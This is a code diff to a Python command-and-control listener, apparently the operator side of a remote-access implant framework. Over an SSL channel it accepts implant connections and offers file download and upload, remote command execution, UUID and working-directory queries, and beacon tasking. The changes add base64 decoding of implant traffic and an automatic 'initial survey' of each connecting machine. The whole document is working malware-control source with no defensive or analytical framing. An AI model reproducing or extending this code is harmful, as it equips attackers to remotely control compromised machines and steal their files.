@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import os
+import os,sys
 abspath = os.path.abspath(sys.argv[0])
 dname = os.path.dirname(abspath)
 os.chdir(dname)
@@ -13,12 +13,13 @@ from os import path, remove, kill, getpid, listdir
 from sys import exit, argv,exc_info
 from sys import path as sys_path
 from signal import SIGTERM
-import tasker
+import tasker,base64
 
 VERBOSE = True
-DEBUG = True
+DEBUG = False
 CURRENT_WORKING_DIR = ""
 TASK_FILES_LOCATION = "tasks"
+CONNECTED_HOST = None
 #IGNORE SSL CHECKS
 
 try:
@@ -170,10 +171,12 @@ def file_transfer_put(conn, commands):       #push file to server
     f.close()
 
 def listen_for_data(conn, mode="print"):
+    if DEBUG:
+        print_info("Waiting for data")
     data = ""
     while not data.endswith('[END]'):
         recv = conn.recv(128)
-        recv_decoded = recv.decode('utf-8')
+        recv_decoded = base64_decode(recv.decode('utf-8'))
         data = data + recv_decoded
     if mode != "print":
         return data.rstrip("[END]")
@@ -185,7 +188,11 @@ def kill_session(conn, source):
     send_data(conn, "[kill]")
     conn.close()
 
-
+def base64_decode(base64_message):
+    base64_bytes = base64_message.encode('ascii')
+    message_bytes = base64.b64decode(base64_bytes)
+    message = message_bytes.decode('ascii')
+    return message
 
 def query_for_tasklist(machine_addr):
     try:
@@ -228,8 +235,18 @@ def delete_task_file(task_file_name):
     except:
         pass
 
+def run_initial_survey(conn):
+    print("=============================")
+    uuid = get_uuid(conn)
+    print(BLUE + "UUID: " + uuid + RSTCOLORS)
+    get_working_dir(conn)
+    print(BLUE + "Connection From: " + CONNECTED_HOST + RSTCOLORS)
+    print(BLUE + "Working Dir: " + CURRENT_WORKING_DIR + RSTCOLORS)
+    print("=============================")
+    print()
+
 def get_uuid(conn):
-    if VERBOSE:
+    if DEBUG:
         print_info("Asking for UUID")
     send_data(conn,"[UUID]")
     uuid = listen_for_data(conn, "store")
@@ -250,6 +267,7 @@ def change_working_dir(conn, path):
 
 def listen():
     global conn
+    global CONNECTED_HOST
 
     options = """\
     1 - Download a File
@@ -305,6 +323,7 @@ def listen():
             conn = context.wrap_socket(newsocket, server_side=True)
             print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
             source = "{}:{}".format(fromaddr[0],fromaddr[1])
+            CONNECTED_HOST = source
             cmd = ""
             get_working_dir(conn)
             if run_tasks is True:
@@ -322,9 +341,12 @@ def listen():
                     print_warn("Presented UUID: {}".format(uuid))
                     conn.shutdown(socket.SHUT_RDWR)
                     conn.close()
+            else:
+                run_initial_survey(conn)
             while True:
                 if run_tasks is True:
                     break
+                
                 prompt = RED + source + "> " + RSTCOLORS
                 if cmd == "":
                     print(options)
@@ -394,7 +416,7 @@ def listen():
                         cmd = ""
                 elif cmd == "6":
                     uuid = get_uuid(conn)
-                    print_good("Found UUID: {}".format(uuid))
+                    print(BLUE + "UUID: {}{}".format(uuid,RSTCOLORS))
                     cmd = ""
                 elif cmd == "7":
                     get_working_dir(conn)
@@ -424,17 +446,7 @@ def listen():
                             data = ""
                             send_data(conn, command)
                             #print_info("Sent:\n"+command)
-                            if DEBUG:
-                                print_info("Waiting for data...")
-                            while not data.endswith('[END]'):
-                                recv = conn.recv(128)
-                                try:
-                                    recv_decoded = recv.decode('utf-8')
-                                except UnicodeDecodeError:
-                                    recv_decoded = recv.decode('cp1251')
-                                data = data + recv_decoded
-                            print(data.rstrip("[END]"))
-                            data = ""
+                            listen_for_data(conn,'print')
                 elif cmd.upper() == "BEACON":
                     ans = print_question_list("Select Option:",
                                             "1 - Query","2 - Configure",
